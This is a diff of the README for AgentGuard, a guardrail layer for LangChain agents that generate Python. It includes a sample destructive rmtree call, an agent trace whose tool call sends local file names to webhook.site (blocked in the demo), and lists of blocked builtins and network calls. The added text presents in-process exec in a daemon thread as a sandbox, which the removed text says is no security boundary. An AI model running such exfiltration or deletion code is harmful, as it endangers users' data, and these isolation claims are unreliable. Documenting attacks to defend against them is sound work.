@@ -1,97 +1,222 @@
-# AgentGuard
+# 🛡️ AgentGuard
 
-> Experimental guardrails and external execution for LangChain Python tools.
+> **A security middleware for LangChain agents** — intercept, validate and safely execute LLM-generated code.
 
 [![CI](https://github.com/Thomas-LEON/agentguard/actions/workflows/ci.yml/badge.svg)](https://github.com/Thomas-LEON/agentguard/actions)
 [![PyPI](https://img.shields.io/pypi/v/securellm-agentguard.svg)](https://pypi.org/project/securellm-agentguard/)
 [![Python](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Code style: ruff](https://img.shields.io/badge/code%20style-ruff-red.svg)](https://github.com/astral-sh/ruff)
 
-## Status and threat model
+---
 
-AgentGuard is an alpha project. It helps LangChain applications apply a policy
-before generated Python is executed, then executes approved code in an external
-Docker container. It is not a substitute for a reviewed deployment architecture,
-and its AST, regex and LLM checks are not security boundaries.
+## 🤔 The Problem
 
-The Docker backend is the security boundary. It creates a short-lived container
-with no host mounts, no network, a read-only root filesystem, a non-root user,
-no Linux capabilities, and CPU, memory and PID limits. If Docker is unavailable,
-execution fails closed: AgentGuard never falls back to Python exec in the host
-process.
+Modern LangChain agents are powerful because they can **generate and execute Python code** autonomously. But this power is a double-edged sword.
 
-Docker and the configured container image are part of the trusted computing base.
-Production users should pin a reviewed image digest and apply their own Docker
-daemon policy. The default image contains only the Python standard library.
+A single malicious prompt or a hallucination can lead an agent to generate code like this:
 
-## Installation
+```python
+# An agent asked to "clean up temp files" might generate:
+import os
+import shutil
+shutil.rmtree("/var/data/users")  # 💀 Oops.
+```
 
-Docker must be installed and available to the application process.
+There is no native guardrail in LangChain to prevent this.
 
-    pip install securellm-agentguard
+**AgentGuard is that guardrail.**
 
-For the optional Gemini semantic reviewer:
+---
 
-    pip install "securellm-agentguard[gemini]"
+## ✅ The Solution
 
-## Quick start
+AgentGuard wraps your agent's code execution tool in a **3-layer security pipeline**. Before any LLM-generated code runs, it must pass through all three layers:
 
-    from agentguard import SafePythonREPLTool, SecurityPolicy
+```mermaid
+flowchart TD
+    A["🤖 LLM Agent generates code"] --> B{"🔍 Layer 1: AST Validator"}
+    B -->|"✅ Pass"| C{"🌐 Layer 2: Network Filter"}
+    B -->|"❌ Blocked"| E["🛡️ SecurityBlockedError\n→ Agent self-corrects"]
+    C -->|"✅ Pass"| D{"🧠 Layer 3: Semantic Judge"}
+    C -->|"❌ Blocked"| E
+    D -->|"✅ SAFE"| F["⚡ Sandboxed exec()\n→ Result back to Agent"]
+    D -->|"❌ UNSAFE"| E
 
-    policy = SecurityPolicy(
-        allowed_modules=["json", "math"],
-        allowed_domains=[],
-        use_semantic_judge=False,
-        execution_timeout=10,
-    )
-    safe_repl = SafePythonREPLTool(policy=policy)
+    style A fill:#4a9eff,color:#fff
+    style B fill:#ff9f43,color:#fff
+    style C fill:#ff9f43,color:#fff
+    style D fill:#ff9f43,color:#fff
+    style E fill:#ee5a24,color:#fff
+    style F fill:#2ed573,color:#fff
+```
 
-    # Pass safe_repl as a LangChain tool.
+If any layer blocks the code, the agent receives a **descriptive error** and **self-corrects** — no crash, no data loss.
 
-To use a reviewed image that includes additional packages, configure the
-external executor explicitly:
+---
 
-    from agentguard import DockerSandboxExecutor, SafePythonREPLTool
+## 🛡️ How it works in Action
 
-    safe_repl = SafePythonREPLTool(
-        policy=policy,
-        sandbox=DockerSandboxExecutor(
-            image="registry.example/agentguard-python@sha256:replace-with-digest"
-        ),
-    )
+When an agent attempts to execute unauthorized system operations, AgentGuard intercepts the execution and provides a self-healing feedback loop back to the LLM:
 
-## Layers
+```text
+> Entering new AgentExecutor chain...
 
-1. AST pre-filter blocks disallowed imports and obvious dangerous calls.
-2. Network pre-filter rejects known URL literals and calls outside the domain
-   allowlist. Docker network isolation enforces the default no-network policy.
-3. Optional semantic review asks a configured LLM for an advisory SAFE or UNSAFE
-   verdict. It is fail-closed on unexpected answers, but must not be treated as
-   an authorization boundary. Enabling it sends generated code to that provider.
-4. Docker execution applies the operating-system-level containment controls.
+Thought: I need to read the local files and send them to a webhook.
+Action: safe_python_repl
+Action Input:
+import os
+import requests
+files = os.listdir('.')
+requests.post('https://webhook.site/test', json={"files": files})
 
-## Security controls
+Observation: [AgentGuard | AST Validator] 🔴 BLOCKED — Forbidden import detected: 'os'. Rewrite the code without the forbidden operation.
+Thought: I am not allowed to use the 'os' module to read files. I cannot fulfill this request as it requires system access.
+Final Answer: 🛑 I am sorry, but I am restricted from accessing the local file system or sending data to external webhooks due to security policies.
+```
 
-SecurityPolicy configures the execution timeout plus memory_limit_mb, cpu_limit,
-pids_limit, max_code_bytes and max_output_bytes. The executor terminates the
-container on a timeout or output-limit violation; it does not leave a daemon
-thread executing after returning a timeout message.
+---
 
-## Development
+## 🚀 Quick Start
 
-    poetry install
-    poetry run pytest tests/ -v
-    poetry run ruff check agentguard/ tests/
-    poetry run mypy agentguard/
+```bash
+pip install securellm-agentguard
+```
 
-The default tests mock the external executor; Docker integration tests should run
-separately in an environment where Docker is available.
+```python
+import os
+from agentguard import SafePythonREPLTool, SecurityPolicy
+from langchain_google_genai import ChatGoogleGenerativeAI
 
-## Responsible disclosure
+os.environ["GEMINI_API_KEY"] = "your-api-key"
 
-Please report vulnerabilities according to [SECURITY.md](SECURITY.md). In
-particular, do not publish sandbox-escape details before a coordinated fix.
+# Define your security rules
+policy = SecurityPolicy(
+    allowed_modules=["pandas", "json", "math"],
+    allowed_domains=["api.github.com"],
+    use_semantic_judge=True,
+)
 
-## License
+# Layer 3 requires a Gemini LLM (optional — Layers 1 & 2 work without it)
+judge_llm = ChatGoogleGenerativeAI(model="gemini-2.0-flash")
+safe_repl = SafePythonREPLTool(policy=policy, judge_llm=judge_llm)
 
-MIT - see [LICENSE](LICENSE).
+# Use it in your LangChain agent instead of PythonREPLTool
+# agent = create_react_agent(llm=your_llm, tools=[safe_repl])
+```
+
+---
+
+## ⚙️ SecurityPolicy Options
+
+| Parameter | Type | Default | Description |
+|---|---|---|---|
+| `allowed_modules` | `list[str]` | `["math", "json", ...]` | Whitelisted Python modules |
+| `allowed_domains` | `list[str]` | `[]` (block all) | Whitelisted network domains |
+| `use_semantic_judge` | `bool` | `True` | Enable Gemini LLM analysis |
+| `execution_timeout` | `int` | `10` | Max execution seconds |
+
+---
+
+## 🔒 Security Layers in Detail
+
+### Layer 1 — AST Static Validator
+
+Uses Python's native `ast` module to parse the code **without executing it**.
+
+**Blocks:**
+- Any `import` not explicitly whitelisted in `allowed_modules`
+- `from X import Y` style imports of non-whitelisted modules
+- Dangerous built-in calls: `exec`, `eval`, `compile`, `open`, `__import__`
+- Sandbox escape vectors: `getattr`, `setattr`, `delattr`, `globals`, `locals`
+
+**Speed:** ~0.1ms — no I/O, no network, pure AST traversal.
+
+### Layer 2 — Network Filter
+
+Uses regex patterns to detect outbound network calls and validates target domains against the whitelist.
+
+**Detects:**
+- `requests.get/post/put/delete/patch/head`
+- `httpx` and `aiohttp` calls
+- `urllib.request.urlopen` and `urlretrieve`
+- Raw `socket.connect()` calls
+- Bare URL literals (`https://...`)
+
+An empty `allowed_domains` list blocks **all** network access.
+
+### Layer 3 — Semantic Judge (Gemini)
+
+For subtle attacks that evade static analysis (e.g. a loop that deletes files one-by-one), the code is sent to `gemini-2.0-flash` with a strict binary prompt.
+
+**Verdict:** Only code classified as `SAFE` passes. Anything else (including ambiguous responses) is blocked — **fail-closed by design**.
+
+**Catches:** Data exfiltration, privilege escalation, destructive file operations, obfuscated malicious intent.
+
+### Sandboxed Execution
+
+Code that passes all 3 layers runs in a restricted environment:
+- **Safe builtins only** — `print`, `len`, `range`, etc. (no `exec`, `eval`, `open`)
+- **stdout capture** — `print()` output is returned to the agent
+- **Timeout enforcement** — configurable via `execution_timeout`
+- **Thread isolation** — execution runs in a daemon thread
+
+---
+
+## 📁 Project Structure
+
+```
+agentguard/
+├── agentguard/
+│   ├── __init__.py              # Public API exports
+│   ├── policy.py                # SecurityPolicy (Pydantic model)
+│   ├── exceptions.py            # SecurityBlockedError
+│   ├── validators/
+│   │   ├── ast_validator.py     # Layer 1: Static AST analysis
+│   │   └── network_filter.py    # Layer 2: Network domain filter
+│   ├── judges/
+│   │   └── gemini_judge.py      # Layer 3: Gemini semantic judge
+│   └── tools/
+│       └── langchain_tool.py    # SafePythonREPLTool (LangChain BaseTool)
+├── tests/                       # Pytest suite (mocked LLM for Layer 3)
+├── examples/
+│   ├── basic_agent.py           # Simple agent + AgentGuard demo
+│   └── threat_intel_demo.py     # Threat analysis agent demo
+├── pyproject.toml               # Poetry config + metadata
+├── .github/workflows/ci.yml     # GitHub Actions CI
+└── README.md
+```
+
+---
+
+## 🗺️ Roadmap
+
+- [x] 3-layer security pipeline (AST + Network + Semantic Judge)
+- [x] LangChain `BaseTool` integration
+- [x] Sandboxed execution with safe builtins
+- [x] Timeout enforcement
+- [x] GitHub Actions CI
+- [ ] **Logging & Audit Trail** — structured logs of every blocked/allowed execution
+- [ ] **Dashboard UI** — web dashboard to visualize security events in real-time
+- [ ] **Rate Limiting** — limit the number of code executions per minute
+- [ ] **Plugin System** — custom validator layers via a simple interface
+- [x] **PyPI Publication** — `pip install securellm-agentguard`
+- [ ] **LangSmith Integration** — trace security events in LangSmith
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
+
+## 🔐 Security
+
+Found a vulnerability? Please read [SECURITY.md](SECURITY.md) for responsible disclosure instructions.
+
+## 📄 License
+
+MIT — see [LICENSE](LICENSE).
+
+---
+
+*Built by [Thomas LEON](https://www.linkedin.com/in/thomas-leon-893316262/) · Emerging Technologies & Threat Intelligence*
